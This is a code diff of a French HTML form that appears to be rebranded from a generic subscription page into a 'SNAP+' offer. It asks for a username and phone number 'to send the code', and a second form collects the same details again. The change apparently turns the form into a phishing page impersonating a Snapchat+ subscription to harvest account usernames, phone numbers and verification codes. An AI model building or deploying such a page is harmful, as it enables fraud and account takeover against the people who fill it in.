@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Formulaire d'abonnement</title>
+<title>ABONNEMENT SNAP+</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,500;12..96,700;12..96,800&family=Hanken+Grotesk:wght@400;500;600&display=swap">
@@ -121,42 +121,42 @@
 </head>
 <body>
   <main class="card">
-    <div class="brand"><span class="dot"></span><span>Ton Service</span></div>
+    <div class="brand"><span class="dot"></span><span>SNAP+</span></div>
 
     <!-- 1) Formulaire -->
     <div id="vue-form">
       <h1>Choisis ton abonnement</h1>
-      <p class="lead">Laisse ton prénom et ton numéro, on te recontacte pour finaliser.</p>
+      <p class="lead">Laisse ton nom d'utilisateur et ton numéro, on te recontacte pour finaliser.</p>
 
       <form id="formulaire" novalidate>
         <div class="field">
-          <label for="prenom">Prénom</label>
+          <label for="prenom">Nom d'utilisateur</label>
           <input type="text" id="prenom" name="prenom" placeholder="Ex : Mohamed" autocomplete="given-name" required>
         </div>
 
         <div class="field">
           <label for="telephone">Numéro de téléphone</label>
           <input type="tel" id="telephone" name="telephone" placeholder="Ex : 06 12 34 56 78" autocomplete="tel" inputmode="tel" pattern="[0-9+().\s-]{6,}" required>
-          <span class="hint">On s'en sert uniquement pour te rappeler.</span>
+          <span class="hint">On s'en sert uniquement pour t'envoyer le code.</span>
         </div>
 
         <fieldset>
-          <legend>Abonnement souhaité</legend>
+          <legend>Abonnement Snap+</legend>
           <div class="plans">
             <label class="plan">
-              <input type="radio" name="abonnement" value="Mensuel" required>
+              <input type="radio" name="abonnement" value="3 mois" required>
               <span class="tick"></span>
-              <span class="plan-text"><span class="plan-name">Mensuel</span><span class="plan-desc">Sans engagement</span></span>
+              <span class="plan-text"><span class="plan-name">3 mois</span></span>
             </label>
             <label class="plan">
-              <input type="radio" name="abonnement" value="Trimestriel">
+              <input type="radio" name="abonnement" value="6 mois">
               <span class="tick"></span>
-              <span class="plan-text"><span class="plan-name">Trimestriel</span><span class="plan-desc">Un seul paiement pour 3 mois</span></span>
+              <span class="plan-text"><span class="plan-name">6 mois</span></span>
             </label>
             <label class="plan">
-              <input type="radio" name="abonnement" value="Annuel">
+              <input type="radio" name="abonnement" value="1 an">
               <span class="tick"></span>
-              <span class="plan-text"><span class="plan-name">Annuel</span><span class="plan-desc">2 mois offerts</span></span>
+              <span class="plan-text"><span class="plan-name">1 an</span></span></span>
             </label>
           </div>
         </fieldset>
@@ -176,8 +176,8 @@
 
       <form id="form-code" novalidate style="gap:14px">
         <div class="field">
-          <label for="code-prenom">Prénom</label>
-          <input type="text" id="code-prenom" name="prenom" placeholder="Ton prénom" autocomplete="given-name" required>
+          <label for="code-prenom">Nom d'utilisateur</label>
+          <input type="text" id="code-prenom" name="prenom" placeholder="Ton Nom d'utilisateur" autocomplete="given-name" required>
         </div>
         <div class="field">
           <label for="code-tel">Ton numéro de téléphone</label>
@@ -219,7 +219,7 @@
     // ⚠️ Mets ici l'adresse de BASE de ton serveur app.py (sans /submit).
     // En local pour tester : "http://127.0.0.1:5000"
     // En ligne (Render) : "https://ton-adresse.onrender.com"
-    const BASE_SERVEUR = "http://127.0.0.1:5000";
+    const BASE_SERVEUR = "";
 
     const vues = {
       form: document.getElementById("vue-form"),
@@ -247,7 +247,7 @@
       const prenom = form.prenom.value.trim();
       const tel = form.telephone.value.trim();
       const abo = form.querySelector('input[name="abonnement"]:checked');
-      if(!prenom){ return erreur(errForm, "Indique ton prénom."); }
+      if(!prenom){ return erreur(errForm, "Indique ton nom d'utilisateur."); }
       if(tel.replace(/[^0-9]/g,"").length < 6){ return erreur(errForm, "Entre un numéro de téléphone valide."); }
       if(!abo){ return erreur(errForm, "Choisis un abonnement."); }
 
